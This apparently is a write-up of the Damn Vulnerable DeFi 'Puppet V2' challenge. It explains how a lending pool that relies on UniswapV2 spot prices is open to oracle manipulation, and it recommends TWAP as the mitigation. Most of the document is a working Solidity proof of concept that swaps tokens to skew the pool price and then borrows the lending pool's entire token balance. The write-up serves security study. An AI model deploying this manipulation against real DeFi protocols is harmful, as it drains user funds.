## Using UniswapV2 as an oracle without leveraging its Time-Weighted Average Price (TWAP) functionality leaves the system vulnerable to oracle manipulation


 The project migrated from UniswapV1 to UniswapV2 as a fix to a reported Oracle Manipulation vulnerability, but such vulnerability persists because it still relies on the spot price from a single block to determine asset ratios. This makes it easy to manipulate the price.

### recomended mitigations
- Implement the TWAP functionacility to fetch the pool ratios. Here's a [nice example by **RareSkills**](https://rareskills.io/post/twap-uniswap-v2?_gl=1*aoenpn*_ga*NTU5NjIyMzY4LjE3NTQ5NDkyNTA.*_ga_NJBVCDMM0W*czE3NTUwMDgzMzUkbzIkZzAkdDE3NTUwMDgzMzUkajYwJGwwJGgw#only-calculating-the-last-1-hour-twap-in-solidity). 

### PoC
Interacter contract:
```solidity
contract Interacter {
    DamnValuableToken token;
    WETH weth;
    IUniswapV2Pair uniswapV2Exchange;
    address player;

    constructor(address _token, address _uniswapV2Exchange, address _weth, address _player) {
        token = DamnValuableToken(payable(_token));
        weth = WETH(payable(_weth));
        uniswapV2Exchange = IUniswapV2Pair(_uniswapV2Exchange);
        player = _player;
    }

    function swap() public {
        uint uv2WethReserve = weth.balanceOf(address(uniswapV2Exchange)); 
        token.transfer(address(uniswapV2Exchange), token.balanceOf(address(this)));
        uniswapV2Exchange.swap(
            uv2WethReserve - 1e17, // substract a bit to keep K after fees
            0, 
            address(this), 
            ''
        );
        // returning the swaped eth to the player, because it will be needed to cover the borrow required underlaying
        weth.transfer(player, weth.balanceOf(address(this)));
    }
}
```

then in the testcase:
```solidity
    function test_puppetV2() public 
    checkSolvedByPlayer 
    {
        Interacter interacter = new Interacter(address(token), address(uniswapV2Exchange), address(weth), player);
        weth.deposit{ value: player.balance }();
        token.transfer(address(interacter), token.balanceOf(player));
        
        interacter.swap();
        
        weth.approve(address(lendingPool), weth.balanceOf(player));
        lendingPool.borrow(token.balanceOf(address(lendingPool)));

        token.transfer(recovery, token.balanceOf(player));
    }
```